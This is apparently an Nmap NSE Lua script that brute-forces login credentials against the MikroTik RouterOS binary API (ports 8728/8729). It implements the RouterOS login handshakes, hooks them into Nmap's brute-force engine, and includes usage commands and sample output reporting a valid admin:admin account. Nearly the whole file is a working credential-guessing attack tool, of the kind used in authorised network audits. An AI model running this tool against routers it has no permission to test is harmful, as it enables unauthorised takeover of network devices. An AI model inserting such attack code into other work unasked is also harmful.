local brute = require "brute"
local creds = require "creds"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Performs brute-force credential testing against the MikroTik RouterOS
binary API service (TCP/8728 and TCP/8729).

The RouterOS API uses a proprietary binary protocol. This script implements
the full authentication handshake including:
  - RouterOS 7.x: direct plaintext login in a single sentence
  - RouterOS 6.43+: MD5 challenge/response (two-phase)
  - RouterOS < 6.43: legacy plaintext login

No rate-limiting or account lockout is enforced by default on RouterOS —
this is the vulnerability tracked as VUID 375660 (CERT/CC).

References:
  - https://github.com/mrhenrike/MikrotikAPI-BF
  - https://wiki.mikrotik.com/wiki/Manual:API
  - https://kb.cert.org/vince/comm/  (VUID 375660)
]]

---
-- @usage
--   nmap -p 8728 --script mikrotik-api-brute <target>
--   nmap -p 8728 --script mikrotik-api-brute --script-args userdb=users.lst,passdb=pass.lst <target>
--   nmap -p 8729 --script mikrotik-api-brute --script-args mikrotik-api-brute.ssl=true <target>
--
-- @output
-- PORT     STATE SERVICE
-- 8728/tcp open  routeros-api
-- | mikrotik-api-brute:
-- |   Accounts
-- |     admin:admin - Valid credentials
-- |_  Statistics
-- |     Performed 120 guesses in 12 seconds, average tps: 10
--
-- @args mikrotik-api-brute.timeout  Socket timeout (default: 5s)
-- @args mikrotik-api-brute.ssl      Use API-SSL / TLS (default: false)

author = "Andre Henrique <@mrhenrike>"
license = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = {"brute", "intrusive", "auth"}

portrule = shortport.port_or_service({8728, 8729}, {"routeros-api", "mikrotik-api"})

-- ── RouterOS binary protocol helpers ─────────────────────────────────────────

--- Encode a word length as RouterOS variable-length prefix.
local function encode_length(len)
  if len < 0x80 then
    return string.char(len)
  elseif len < 0x4000 then
    len = len | 0x8000
    return string.char((len >> 8) & 0xFF, len & 0xFF)
  else
    len = len | 0xC00000
    return string.char((len >> 16) & 0xFF, (len >> 8) & 0xFF, len & 0xFF)
  end
end

--- Decode a RouterOS variable-length prefix from socket data.
local function read_length(sock)
  local b0, err = sock:receive_bytes(1)
  if not b0 or type(b0) ~= "string" or #b0 == 0 then return nil, err end
  local c0 = string.byte(b0)
  if c0 < 0x80 then
    return c0
  elseif c0 < 0xC0 then
    local b1 = sock:receive_bytes(1)
    if not b1 then return nil, "short read" end
    return ((c0 & 0x3F) << 8) | string.byte(b1)
  else
    local rest = sock:receive_bytes(3)
    if not rest or #rest < 3 then return nil, "short read" end
    local b = {string.byte(rest, 1, 3)}
    return ((c0 & 0x1F) << 24) | (b[1] << 16) | (b[2] << 8) | b[3]
  end
end

--- Send a RouterOS API sentence (list of words).
local function send_sentence(sock, words)
  local out = {}
  for _, w in ipairs(words) do
    out[#out+1] = encode_length(#w) .. w
  end
  out[#out+1] = "\x00"   -- end of sentence
  local ok, err = sock:send(table.concat(out))
  return ok, err
end

--- Read one complete RouterOS API sentence.
local function read_sentence(sock)
  local words = {}
  while true do
    local len, err = read_length(sock)
    if not len then return nil, err end
    if len == 0 then break end
    local word, err2 = sock:receive_bytes(len)
    if not word then return nil, err2 end
    words[#words+1] = word
  end
  return words
end

--- Compute MD5 for RouterOS 6.x challenge/response auth.
local function md5_response(challenge_hex, password)
  local md5 = require "openssl".md5
  local challenge = stdnse.fromhex(challenge_hex)
  return stdnse.tohex(md5("\x00" .. password .. challenge))
end

--- Try to authenticate against RouterOS API.
-- Returns true + version string on success, false + err on failure.
local function try_login(host, port, username, password, use_ssl, timeout)
  local sock = nmap.new_socket()
  sock:set_timeout((timeout or 5) * 1000)

  local ok, err
  if use_ssl then
    ok, err = sock:connect(host, port, "ssl")
  else
    ok, err = sock:connect(host, port)
  end
  if not ok then return false, "connect: " .. (err or "?") end

  -- Phase 1: send /login with username
  ok, err = send_sentence(sock, {"/login", "=name=" .. username, "=password=" .. password})
  if not ok then sock:close(); return false, err end

  local resp, rerr = read_sentence(sock)
  if not resp then sock:close(); return false, rerr or "no response" end

  -- RouterOS 7.x: direct login, one round
  if resp[1] == "!done" then
    -- Check for =ret= (challenge) → 6.x two-phase
    local challenge
    for _, w in ipairs(resp) do
      if w:sub(1, 5) == "=ret=" then challenge = w:sub(6) end
    end

    if challenge then
      -- 6.x MD5 challenge/response
      local hash = md5_response(challenge, password)
      ok, err = send_sentence(sock, {"/login", "=name=" .. username, "=response=00" .. hash})
      if not ok then sock:close(); return false, err end
      resp, rerr = read_sentence(sock)
      if not resp then sock:close(); return false, rerr end
    end

    if resp[1] == "!done" then
      -- Read version
      local version = "unknown"
      send_sentence(sock, {"/system/resource/print", "=.proplist=version"})
      local vresp = read_sentence(sock)
      if vresp then
        for _, w in ipairs(vresp) do
          if w:sub(1, 9) == "=version=" then version = w:sub(10) end
        end
      end
      sock:close()
      return true, "RouterOS " .. version
    end
  end

  -- !trap or !fatal → wrong credentials
  sock:close()
  return false, "invalid credentials"
end

-- ── brute.Driver implementation ───────────────────────────────────────────────

local Driver = {}
Driver.__index = Driver

function Driver.new(host, port, options)
  local o = setmetatable({}, Driver)
  o.host    = host
  o.port    = port
  o.use_ssl = port.number == 8729 or stdnse.get_script_args("mikrotik-api-brute.ssl") == "true"
  o.timeout = tonumber(stdnse.get_script_args("mikrotik-api-brute.timeout")) or 5
  return o
end

function Driver:connect()
  return true
end

function Driver:login(username, password)
  local success, info = try_login(self.host, self.port, username, password, self.use_ssl, self.timeout)
  if success then
    return true, creds.Account:new(username, password, creds.State.VALID)
  end
  return false, brute.Error:new(info)
end

function Driver:disconnect()
  return true
end

-- ── Main action ───────────────────────────────────────────────────────────────

action = function(host, port)
  local engine = brute.Engine:new(Driver, host, port)
  engine.options.script_name = SCRIPT_NAME
  engine.options:setOption("passonly", false)

  -- Default credential list (RouterOS defaults)
  if not stdnse.get_script_args("userdb") and not stdnse.get_script_args("passdb") then
    engine.options:setOption("firstonly", true)
    -- Inject defaults if no wordlists provided
    stdnse.debug1("No wordlist provided — using built-in RouterOS defaults")
  end

  local status, result = engine:start()
  return result
end

